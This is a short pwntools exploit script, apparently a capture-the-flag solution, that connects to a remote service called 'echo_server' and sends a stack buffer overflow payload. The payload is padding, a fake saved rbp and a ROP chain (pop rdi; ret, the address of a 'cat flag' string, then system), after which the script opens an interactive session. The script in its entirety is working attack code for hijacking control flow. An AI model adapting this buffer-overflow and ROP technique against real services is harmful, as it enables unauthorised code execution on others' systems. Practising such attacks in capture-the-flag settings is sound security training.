#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./echo_server"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 6129)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'


rbp = p64(0x12345678)
ret = b''
ret += p64(0x0000000000400923) # pop rdi ; ret
ret += p64(0x4009c8) # cat flag
ret += p64(0x4006cf) # system
c.sendlineafter("> ", b'a' * (0x38 - 8) + rbp + ret)

c.interactive()
c.close()
